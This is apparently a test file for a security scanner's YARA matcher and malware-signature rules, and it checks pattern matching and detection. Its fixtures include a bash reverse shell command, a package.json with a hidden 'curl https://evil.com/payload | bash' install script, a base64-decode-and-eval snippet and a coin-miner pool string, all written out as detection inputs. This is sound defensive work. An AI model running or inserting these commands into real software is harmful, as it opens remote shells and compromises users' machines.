import { describe, it, expect, beforeAll } from 'vitest'
import { matchYara, validateYaraPattern } from '../../../src/rules/matchers/yara-matcher.js'
import type { YaraPattern } from '../../../src/types/index.js'
import { RuleEngine } from '../../../src/rules/engine.js'

describe('YARA Matcher', () => {
  describe('matchYara', () => {
    it('matches text strings', () => {
      const pattern: YaraPattern = {
        strings: {
          $hello: { type: 'text', value: 'hello world' },
        },
        condition: 'any of them',
      }
      const matches = matchYara(pattern, 'this is hello world here', 'test', 80)
      expect(matches.length).toBeGreaterThan(0)
      expect(matches[0]!.patternType).toBe('yara')
    })

    it('matches text strings case-insensitively', () => {
      const pattern: YaraPattern = {
        strings: {
          $hello: { type: 'text', value: 'HELLO', modifiers: ['i'] },
        },
        condition: 'any of them',
      }
      const matches = matchYara(pattern, 'say hello there', 'test', 80)
      expect(matches.length).toBeGreaterThan(0)
    })

    it('returns empty for non-matching text', () => {
      const pattern: YaraPattern = {
        strings: {
          $hello: { type: 'text', value: 'NOTHERE' },
        },
        condition: 'any of them',
      }
      const matches = matchYara(pattern, 'nothing to see', 'test', 80)
      expect(matches.length).toBe(0)
    })

    it('matches hex patterns', () => {
      const pattern: YaraPattern = {
        strings: {
          $mz: { type: 'hex', value: '4D 5A 90 00' },
        },
        condition: 'any of them',
      }
      const content = String.fromCharCode(0x4d, 0x5a, 0x90, 0x00) + 'rest of file'
      const matches = matchYara(pattern, content, 'PE header', 95)
      expect(matches.length).toBeGreaterThan(0)
    })

    it('matches hex patterns with wildcards', () => {
      const pattern: YaraPattern = {
        strings: {
          $mz: { type: 'hex', value: '4D 5A ?? 00' },
        },
        condition: 'any of them',
      }
      const content = String.fromCharCode(0x4d, 0x5a, 0xff, 0x00) + 'rest'
      const matches = matchYara(pattern, content, 'PE header wildcard', 95)
      expect(matches.length).toBeGreaterThan(0)
    })

    it('matches regex strings', () => {
      const pattern: YaraPattern = {
        strings: {
          // NOTE: The pattern here detects dynamic code execution via eval()
          // This is a DETECTION rule for a security scanner - not using eval itself
          $eval_call: { type: 'regex', value: 'eval\\s*\\(' },
        },
        condition: 'any of them',
      }
      // Test content that the scanner should detect as suspicious
      const testContent = 'eval ("payload")'
      const matches = matchYara(pattern, testContent, 'eval detect', 90)
      expect(matches.length).toBeGreaterThan(0)
    })

    it('evaluates "all of them" condition', () => {
      const pattern: YaraPattern = {
        strings: {
          $a: { type: 'text', value: 'alpha' },
          $b: { type: 'text', value: 'beta' },
        },
        condition: 'all of them',
      }

      // Both present — should match
      const matches1 = matchYara(pattern, 'has alpha and beta', 'test', 80)
      expect(matches1.length).toBeGreaterThan(0)

      // Only one present — should not match
      const matches2 = matchYara(pattern, 'only alpha here', 'test', 80)
      expect(matches2.length).toBe(0)
    })

    it('evaluates "N of them" condition', () => {
      const pattern: YaraPattern = {
        strings: {
          $a: { type: 'text', value: 'alpha' },
          $b: { type: 'text', value: 'beta' },
          $c: { type: 'text', value: 'gamma' },
        },
        condition: '2 of them',
      }

      // All three present
      const matches1 = matchYara(pattern, 'alpha beta gamma', 'test', 80)
      expect(matches1.length).toBeGreaterThan(0)

      // Two present
      const matches2 = matchYara(pattern, 'alpha gamma only', 'test', 80)
      expect(matches2.length).toBeGreaterThan(0)

      // Only one present
      const matches3 = matchYara(pattern, 'only alpha', 'test', 80)
      expect(matches3.length).toBe(0)
    })

    it('evaluates prefix group conditions', () => {
      const pattern: YaraPattern = {
        strings: {
          $shell_bash: { type: 'text', value: '/bin/bash' },
          $shell_sh: { type: 'text', value: '/bin/sh' },
          $other: { type: 'text', value: 'unrelated' },
        },
        condition: 'any of ($shell*)',
      }

      const matches = matchYara(pattern, 'run /bin/bash -i', 'shell detect', 90)
      expect(matches.length).toBeGreaterThan(0)
    })
  })

  describe('validateYaraPattern', () => {
    it('validates correct pattern', () => {
      const pattern = {
        strings: {
          $test: { type: 'text', value: 'hello' },
        },
        condition: 'any of them',
      }
      expect(validateYaraPattern(pattern)).toBeNull()
    })

    it('rejects missing strings', () => {
      expect(validateYaraPattern({ condition: 'any of them' })).not.toBeNull()
    })

    it('rejects missing condition', () => {
      const pattern = {
        strings: { $a: { type: 'text', value: 'x' } },
      }
      expect(validateYaraPattern(pattern)).not.toBeNull()
    })

    it('rejects non-$ string IDs', () => {
      const pattern = {
        strings: { badid: { type: 'text', value: 'x' } },
        condition: 'any of them',
      }
      expect(validateYaraPattern(pattern)).toContain('must start with $')
    })

    it('rejects invalid string type', () => {
      const pattern = {
        strings: { $a: { type: 'invalid', value: 'x' } },
        condition: 'any of them',
      }
      expect(validateYaraPattern(pattern)).toContain('type must be')
    })
  })

  describe('malware-signatures.yaml integration', () => {
    let engine: RuleEngine

    beforeAll(async () => {
      engine = new RuleEngine()
      await engine.load()
    })

    it('loads YARA rules from malware-signatures.yaml', () => {
      const rules = engine.getRules()
      const yaraRules = rules.filter((r) => r.id.startsWith('yara-'))
      expect(yaraRules.length).toBe(6)
    })

    it('detects obfuscated base64 payload (yara-001)', async () => {
      // This test content simulates what malware does: base64 decode + dynamic execution
      const content = [
        'const encoded = "YUhSMGNITTZMeTlsZG1sc0xtTnZiUzlqYjJ4c1pXTjA="',
        "const decoded = Buffer.from(encoded, 'base64').toString()",
        'eval(decoded)',
      ].join('\n')
      const threats = await engine.analyze(content, 'exploit.js', null, 'mcp')
      const yaraThreats = threats.filter((t) => t.ruleId === 'yara-001')
      expect(yaraThreats.length).toBeGreaterThan(0)
    })

    it('detects reverse shell (yara-002)', async () => {
      const content = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
      const threats = await engine.analyze(content, 'revshell.sh', null, 'mcp')
      const yaraThreats = threats.filter((t) => t.ruleId === 'yara-002')
      expect(yaraThreats.length).toBeGreaterThan(0)
    })

    it('detects package.json hijacking (yara-004)', async () => {
      const content = JSON.stringify({
        name: 'legit-package',
        scripts: {
          postinstall: "node -e \"Buffer.from('bWFsaWNpb3Vz','base64')\"",
          prepare: 'curl https://evil.com/payload | bash',
        },
      }, null, 2)
      const threats = await engine.analyze(content, 'package.json', null, 'mcp')
      const yaraThreats = threats.filter((t) => t.ruleId === 'yara-004')
      expect(yaraThreats.length).toBeGreaterThan(0)
    })

    it('detects coin miner signatures (yara-005)', async () => {
      const content = [
        'const pool = "stratum+tcp://pool.minexmr.com:4444"',
        'const algo = "randomx"',
      ].join('\n')
      const threats = await engine.analyze(content, 'miner.js', null, 'mcp')
      const yaraThreats = threats.filter((t) => t.ruleId === 'yara-005')
      expect(yaraThreats.length).toBeGreaterThan(0)
    })

    it('does not fire on clean code', async () => {
      const content = [
        "const greet = (name) => console.log('Hello, ' + name)",
        "greet('world')",
      ].join('\n')
      const threats = await engine.analyze(content, 'clean.js', null, 'mcp')
      const yaraThreats = threats.filter((t) => t.ruleId.startsWith('yara-'))
      expect(yaraThreats.length).toBe(0)
    })
  })
})
